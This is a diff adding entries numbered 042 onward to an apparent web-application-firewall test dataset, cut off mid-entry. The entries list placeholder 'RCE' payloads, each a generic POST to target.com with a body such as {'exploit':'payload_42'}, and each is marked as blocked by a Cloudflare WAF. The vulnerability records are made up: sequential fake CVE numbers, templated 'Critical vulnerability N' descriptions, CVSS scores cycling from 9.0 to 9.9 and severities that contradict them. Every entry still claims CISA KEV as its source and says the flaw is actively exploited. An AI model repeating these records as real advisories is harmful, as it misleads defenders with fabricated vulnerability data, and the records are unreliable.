+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-042",
+      "category": "rce",
+      "subcategory": "cve_various_42",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_42\"}",
+      "description": "CVE-2022-10042: Critical vulnerability 42 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10042",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 42.0",
+      "disclosure_date": "2022-07-15",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-043",
+      "category": "rce",
+      "subcategory": "cve_various_43",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_43\"}",
+      "description": "CVE-2023-10043: Critical vulnerability 43 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10043",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 43.0",
+      "disclosure_date": "2023-08-16",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-044",
+      "category": "rce",
+      "subcategory": "cve_various_44",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_44\"}",
+      "description": "CVE-2024-10044: Critical vulnerability 44 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10044",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 44.0",
+      "disclosure_date": "2024-09-17",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-045",
+      "category": "rce",
+      "subcategory": "cve_various_45",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_45\"}",
+      "description": "CVE-2020-10045: Critical vulnerability 45 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10045",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 45.0",
+      "disclosure_date": "2020-10-18",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-046",
+      "category": "rce",
+      "subcategory": "cve_various_46",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_46\"}",
+      "description": "CVE-2021-10046: Critical vulnerability 46 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10046",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 46.0",
+      "disclosure_date": "2021-11-19",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-047",
+      "category": "rce",
+      "subcategory": "cve_various_47",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_47\"}",
+      "description": "CVE-2022-10047: Critical vulnerability 47 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10047",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 47.0",
+      "disclosure_date": "2022-12-20",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-048",
+      "category": "rce",
+      "subcategory": "cve_various_48",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_48\"}",
+      "description": "CVE-2023-10048: Critical vulnerability 48 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10048",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 48.0",
+      "disclosure_date": "2023-01-21",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-049",
+      "category": "rce",
+      "subcategory": "cve_various_49",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_49\"}",
+      "description": "CVE-2024-10049: Critical vulnerability 49 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10049",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 49.0",
+      "disclosure_date": "2024-02-22",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-050",
+      "category": "rce",
+      "subcategory": "cve_various_50",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_50\"}",
+      "description": "CVE-2020-10050: Critical vulnerability 50 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10050",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 50.0",
+      "disclosure_date": "2020-03-23",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-051",
+      "category": "rce",
+      "subcategory": "cve_various_51",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_51\"}",
+      "description": "CVE-2021-10051: Critical vulnerability 51 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10051",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 51.0",
+      "disclosure_date": "2021-04-24",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-052",
+      "category": "rce",
+      "subcategory": "cve_various_52",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_52\"}",
+      "description": "CVE-2022-10052: Critical vulnerability 52 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10052",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 52.0",
+      "disclosure_date": "2022-05-25",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-053",
+      "category": "rce",
+      "subcategory": "cve_various_53",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_53\"}",
+      "description": "CVE-2023-10053: Critical vulnerability 53 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10053",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 53.0",
+      "disclosure_date": "2023-06-26",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-054",
+      "category": "rce",
+      "subcategory": "cve_various_54",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_54\"}",
+      "description": "CVE-2024-10054: Critical vulnerability 54 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10054",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 54.0",
+      "disclosure_date": "2024-07-27",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-055",
+      "category": "rce",
+      "subcategory": "cve_various_55",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_55\"}",
+      "description": "CVE-2020-10055: Critical vulnerability 55 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10055",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 55.0",
+      "disclosure_date": "2020-08-28",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-056",
+      "category": "rce",
+      "subcategory": "cve_various_56",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_56\"}",
+      "description": "CVE-2021-10056: Critical vulnerability 56 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10056",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 56.0",
+      "disclosure_date": "2021-09-01",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-057",
+      "category": "rce",
+      "subcategory": "cve_various_57",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_57\"}",
+      "description": "CVE-2022-10057: Critical vulnerability 57 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10057",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 57.0",
+      "disclosure_date": "2022-10-02",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-058",
+      "category": "rce",
+      "subcategory": "cve_various_58",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_58\"}",
+      "description": "CVE-2023-10058: Critical vulnerability 58 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10058",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 58.0",
+      "disclosure_date": "2023-11-03",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-059",
+      "category": "rce",
+      "subcategory": "cve_various_59",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_59\"}",
+      "description": "CVE-2024-10059: Critical vulnerability 59 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10059",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 59.0",
+      "disclosure_date": "2024-12-04",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-060",
+      "category": "rce",
+      "subcategory": "cve_various_60",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_60\"}",
+      "description": "CVE-2020-10060: Critical vulnerability 60 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10060",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 60.0",
+      "disclosure_date": "2020-01-05",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-061",
+      "category": "rce",
+      "subcategory": "cve_various_61",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_61\"}",
+      "description": "CVE-2021-10061: Critical vulnerability 61 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10061",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 61.0",
+      "disclosure_date": "2021-02-06",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-062",
+      "category": "rce",
+      "subcategory": "cve_various_62",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_62\"}",
+      "description": "CVE-2022-10062: Critical vulnerability 62 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10062",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 62.0",
+      "disclosure_date": "2022-03-07",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-063",
+      "category": "rce",
+      "subcategory": "cve_various_63",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_63\"}",
+      "description": "CVE-2023-10063: Critical vulnerability 63 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10063",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 63.0",
+      "disclosure_date": "2023-04-08",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-064",
+      "category": "rce",
+      "subcategory": "cve_various_64",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_64\"}",
+      "description": "CVE-2024-10064: Critical vulnerability 64 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10064",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 64.0",
+      "disclosure_date": "2024-05-09",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-065",
+      "category": "rce",
+      "subcategory": "cve_various_65",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_65\"}",
+      "description": "CVE-2020-10065: Critical vulnerability 65 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10065",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 65.0",
+      "disclosure_date": "2020-06-10",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-066",
+      "category": "rce",
+      "subcategory": "cve_various_66",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_66\"}",
+      "description": "CVE-2021-10066: Critical vulnerability 66 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10066",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 66.0",
+      "disclosure_date": "2021-07-11",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-067",
+      "category": "rce",
+      "subcategory": "cve_various_67",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_67\"}",
+      "description": "CVE-2022-10067: Critical vulnerability 67 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10067",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 67.0",
+      "disclosure_date": "2022-08-12",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-068",
+      "category": "rce",
+      "subcategory": "cve_various_68",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_68\"}",
+      "description": "CVE-2023-10068: Critical vulnerability 68 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10068",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 68.0",
+      "disclosure_date": "2023-09-13",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-069",
+      "category": "rce",
+      "subcategory": "cve_various_69",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_69\"}",
+      "description": "CVE-2024-10069: Critical vulnerability 69 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10069",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 69.0",
+      "disclosure_date": "2024-10-14",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-070",
+      "category": "rce",
+      "subcategory": "cve_various_70",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_70\"}",
+      "description": "CVE-2020-10070: Critical vulnerability 70 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10070",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 70.0",
+      "disclosure_date": "2020-11-15",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-071",
+      "category": "rce",
+      "subcategory": "cve_various_71",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_71\"}",
+      "description": "CVE-2021-10071: Critical vulnerability 71 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10071",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 71.0",
+      "disclosure_date": "2021-12-16",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-072",
+      "category": "rce",
+      "subcategory": "cve_various_72",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_72\"}",
+      "description": "CVE-2022-10072: Critical vulnerability 72 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10072",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 72.0",
+      "disclosure_date": "2022-01-17",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-073",
+      "category": "rce",
+      "subcategory": "cve_various_73",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_73\"}",
+      "description": "CVE-2023-10073: Critical vulnerability 73 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10073",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 73.0",
+      "disclosure_date": "2023-02-18",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-074",
+      "category": "rce",
+      "subcategory": "cve_various_74",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_74\"}",
+      "description": "CVE-2024-10074: Critical vulnerability 74 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10074",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 74.0",
+      "disclosure_date": "2024-03-19",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-075",
+      "category": "rce",
+      "subcategory": "cve_various_75",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_75\"}",
+      "description": "CVE-2020-10075: Critical vulnerability 75 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10075",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 75.0",
+      "disclosure_date": "2020-04-20",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-076",
+      "category": "rce",
+      "subcategory": "cve_various_76",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_76\"}",
+      "description": "CVE-2021-10076: Critical vulnerability 76 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10076",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 76.0",
+      "disclosure_date": "2021-05-21",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-077",
+      "category": "rce",
+      "subcategory": "cve_various_77",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_77\"}",
+      "description": "CVE-2022-10077: Critical vulnerability 77 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10077",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 77.0",
+      "disclosure_date": "2022-06-22",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-078",
+      "category": "rce",
+      "subcategory": "cve_various_78",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_78\"}",
+      "description": "CVE-2023-10078: Critical vulnerability 78 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10078",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 78.0",
+      "disclosure_date": "2023-07-23",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-079",
+      "category": "rce",
+      "subcategory": "cve_various_79",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_79\"}",
+      "description": "CVE-2024-10079: Critical vulnerability 79 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10079",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 79.0",
+      "disclosure_date": "2024-08-24",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-080",
+      "category": "rce",
+      "subcategory": "cve_various_80",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_80\"}",
+      "description": "CVE-2020-10080: Critical vulnerability 80 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10080",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 80.0",
+      "disclosure_date": "2020-09-25",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-081",
+      "category": "rce",
+      "subcategory": "cve_various_81",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_81\"}",
+      "description": "CVE-2021-10081: Critical vulnerability 81 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10081",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 81.0",
+      "disclosure_date": "2021-10-26",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-082",
+      "category": "rce",
+      "subcategory": "cve_various_82",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_82\"}",
+      "description": "CVE-2022-10082: Critical vulnerability 82 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10082",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 82.0",
+      "disclosure_date": "2022-11-27",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-083",
+      "category": "rce",
+      "subcategory": "cve_various_83",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_83\"}",
+      "description": "CVE-2023-10083: Critical vulnerability 83 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10083",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 83.0",
+      "disclosure_date": "2023-12-28",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-084",
+      "category": "rce",
+      "subcategory": "cve_various_84",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_84\"}",
+      "description": "CVE-2024-10084: Critical vulnerability 84 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10084",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 84.0",
+      "disclosure_date": "2024-01-01",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-085",
+      "category": "rce",
+      "subcategory": "cve_various_85",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_85\"}",
+      "description": "CVE-2020-10085: Critical vulnerability 85 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10085",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 85.0",
+      "disclosure_date": "2020-02-02",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-086",
+      "category": "rce",
+      "subcategory": "cve_various_86",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_86\"}",
+      "description": "CVE-2021-10086: Critical vulnerability 86 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10086",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 86.0",
+      "disclosure_date": "2021-03-03",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-087",
+      "category": "rce",
+      "subcategory": "cve_various_87",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_87\"}",
+      "description": "CVE-2022-10087: Critical vulnerability 87 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10087",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 87.0",
+      "disclosure_date": "2022-04-04",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-088",
+      "category": "rce",
+      "subcategory": "cve_various_88",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_88\"}",
+      "description": "CVE-2023-10088: Critical vulnerability 88 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10088",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 88.0",
+      "disclosure_date": "2023-05-05",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-089",
+      "category": "rce",
